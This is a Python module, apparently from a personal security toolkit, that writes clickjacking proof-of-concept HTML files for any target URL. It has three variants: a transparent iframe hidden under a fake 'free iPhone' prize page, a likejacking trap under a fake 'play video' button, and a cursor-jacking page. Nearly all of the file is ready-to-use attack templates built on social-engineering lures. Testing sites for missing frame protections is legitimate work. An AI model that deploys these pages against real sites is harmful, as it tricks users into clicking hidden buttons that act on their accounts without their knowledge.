"""
Aadi — Clickjacking PoC Generator Module with Sub-types
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import os
from rich.console import Console
from rich.prompt import Prompt

console = Console()


def generate_clickjack_poc(target_url: str = None):
    """
    Generate Advanced Clickjacking / UI Redressing PoC HTML templates
    supporting multiple sub-types (Classic, Likejacking, Cursor-Jacking).
    """
    console.rule("[bold magenta]🖱️ Advanced Clickjacking PoC Generator[/]")

    if not target_url:
        target_url = Prompt.ask("[cyan]Enter target web URL (e.g., https://example.com/login)[/]")

    console.print("\n[bold cyan]Select Clickjacking Attack Sub-Type:[/]")
    console.print("  [cyan]1.[/] Classic Clickjacking (Invisible Transparent Overlay)")
    console.print("  [cyan]2.[/] Likejacking (Social Media / Button Trap)")
    console.print("  [cyan]3.[/] Cursor-Jacking (Fake Cursor Deception)")

    sub_choice = Prompt.ask("Select Option", choices=["1", "2", "3"], default="1")

    output_filename = Prompt.ask("[cyan]Output HTML filename[/]", default="clickjack_poc.html")

    # सब-टाइप के आधार पर HTML टेम्पलेट तैयार करना
    if sub_choice == "1":
        # Classic Transparent Overlay PoC
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>AADI - Clickjacking PoC (Classic)</title>
    <style>
        html, body {{
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }}
        #bait {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #f4f4f4;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1;
        }}
        .btn {{
            padding: 15px 30px;
            font-size: 20px;
            background: #ff4757;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }}
        #victim {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.00; /* Fully Transparent */
            z-index: 2;
        }}
    </style>
</head>
<body>
    <div id="bait">
        <h1>🎉 Congratulations! You won a Free iPhone!</h1>
        <p>Click the button below immediately to claim your prize.</p>
        <button class="btn">CLAIM PRIZE NOW</button>
    </div>

    <!-- Target Frame Overlay -->
    <iframe id="victim" src="{target_url}"></iframe>
</body>
</html>
"""
    elif sub_choice == "2":
        # Likejacking PoC
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>AADI - Clickjacking PoC (Likejacking)</title>
    <style>
        body {{
            background: #1e1e1e;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }}
        .container {{
            position: relative;
            width: 400px;
            height: 250px;
            margin: 0 auto;
            background: #2d2d2d;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 8px 16px rgba(0,0,0,0.5);
        }}
        .fake-button {{
            position: absolute;
            top: 100px;
            left: 100px;
            padding: 12px 25px;
            background: #2ed573;
            color: black;
            font-weight: bold;
            border-radius: 5px;
            z-index: 1;
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.01;
            z-index: 2;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <h1>🔥 Watch This Funny Video!</h1>
    <div class="container">
        <div class="fake-button">▶ PLAY VIDEO</div>
        <iframe src="{target_url}"></iframe>
    </div>
</body>
</html>
"""
    else:
        # Cursor-Jacking PoC
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>AADI - Clickjacking PoC (Cursor-Jacking)</title>
    <style>
        body {{
            height: 100vh;
            margin: 0;
            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="red" d="M12 2l10 20h-20z"/></svg>'), auto;
        }}
        iframe {{
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0.2; /* Visible for demonstration */
        }}
    </style>
</head>
<body>
    <div style="position:fixed; top:10px; left:10px; background:yellow; color:black; padding:5px; z-index:99;">
        ⚠️ Notice: Move your mouse towards the highlighted region.
    </div>
    <iframe src="{target_url}"></iframe>
</body>
</html>
"""

    try:
        with open(output_filename, "w", encoding="utf-8") as f:
            f.write(html_content)
        console.print(f"\n[bold green]✓ Clickjacking PoC generated successfully:[/] {output_filename}")
        console.print(f"[dim]Sub-type selected: Option {sub_choice} | Target: {target_url}[/]")
    except Exception as e:
        console.print(f"[bold red]✗ Failed to write file:[/] {e}")